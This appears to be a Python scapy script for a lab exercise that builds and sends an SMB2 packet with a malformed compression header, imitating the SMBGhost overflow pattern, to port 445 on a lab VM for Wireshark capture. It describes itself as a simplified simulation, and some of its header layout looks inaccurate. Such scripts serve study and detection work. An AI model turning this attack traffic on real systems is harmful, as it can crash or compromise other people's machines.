from scapy.all import *
import struct

def create_malformed_smb_compression(target_ip):
    """
    Creates an SMB2 packet with malformed compression header
    This simulates the SMBGhost vulnerability pattern
    """
    print(f"[*] Creating malformed SMB compression packet for {target_ip}")
    
    # IP and TCP layers
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=445, flags="PA")
    
    # SMB2 Header (simplified for simulation)
    smb2_header = (
        b"\xfe\x53\x4d\x42"      # Protocol ID: SMB2
        b"\x40\x00"              # Structure size (64 bytes)
        b"\x00\x00"              # Credit charge
        b"\x00\x00\x00\x00"      # Status
        b"\x00\x00"              # Command: NEGOTIATE (0x0000)
        b"\x01\x00"              # Credits requested
        b"\x00\x00\x00\x00"      # Flags
        b"\x00\x00\x00\x00"      # Next command
        b"\x00\x00\x00\x00\x00\x00\x00\x00"  # Message ID
        b"\x00\x00\x00\x00"      # Process ID
        b"\x00\x00\x00\x00"      # Tree ID
        b"\x00\x00\x00\x00\x00\x00\x00\x00"  # Session ID
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"  # Signature
    )
    
    # MALFORMED compression transform header
    # This is the key part - simulating the vulnerability
    malformed_compression = (
        b"\xfc\x53\x4d\x42"      # Compression signature
        b"\x00\x00\x00\x00"      # Original size (placeholder)
        b"\x01\x00"              # Compression algorithm: LZNT1
        b"\x00\x00"              # Flags
        b"\xFF\xFF\xFF\xFF"      # MALFORMED: Offset field (triggers integer overflow)
    )
    
    # Combine everything
    full_payload = smb2_header + malformed_compression
    
    # Create final packet
    packet = ip/tcp/Raw(load=full_payload)
    
    return packet

def send_test_packet(target_ip, packet_type="malformed"):
    """
    Sends test packet to target
    """
    if packet_type == "malformed":
        packet = create_malformed_smb_compression(target_ip)
    
    print(f"[*] Sending {packet_type} packet to {target_ip}")
    print(f"[*] Packet size: {len(packet)} bytes")
    
    # Send without waiting for response (this simulates attack traffic)
    send(packet, verbose=0)
    
    print(f"[✓] Packet sent!")
    return True

# Main execution
if __name__ == "__main__":
    print("="*60)
    print("MALFORMED SMB PACKET GENERATOR")
    print("="*60)
    
    vulnerable_vm = "192.168.32.20"  # Update with your IP
    
    print(f"\n[!] Target: {vulnerable_vm}")
    print("[!] Make sure Wireshark is capturing on target VM")
    input("\nPress ENTER when ready to send packet...")
    
    send_test_packet(vulnerable_vm, "malformed")
    
    print("\n[✓] Test complete. Check Wireshark on target VM.")